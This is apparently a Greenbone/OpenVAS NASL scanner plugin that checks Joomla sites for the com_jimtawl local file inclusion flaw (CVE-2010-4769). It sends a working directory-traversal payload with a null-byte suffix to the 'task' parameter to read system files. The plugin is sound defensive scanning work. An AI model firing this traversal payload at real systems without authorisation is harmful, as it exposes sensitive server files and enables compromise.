CPE = "cpe:/a:joomla:joomla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100919" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-11-29 13:18:51 +0100 (Mon, 29 Nov 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2010-4769" );
	script_bugtraq_id( 44992 );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Joomla Component 'com_jimtawl' Local File Include Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44992" );
	script_xref( name: "URL", value: "http://extensions.joomla.org/extensions/multimedia/streaming-a-broadcasting/audio-broadcasting/4344" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "joomla_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "joomla/installed" );
	script_tag( name: "summary", value: "The 'com_jimtawl' component for Joomla! is prone to a local file-include
vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially sensitive information and execute arbitrary local
scripts in the context of the webserver process. This may allow the attacker to compromise the application and the
underlying computer.

com_jimtawl 1.0.2 is vulnerable, other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = NASLString( dir, "/index.php?option=com_jimtawl&Itemid=12&task=", crap( data: "../", length: 3 * 15 ), files[file], "%00" );
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

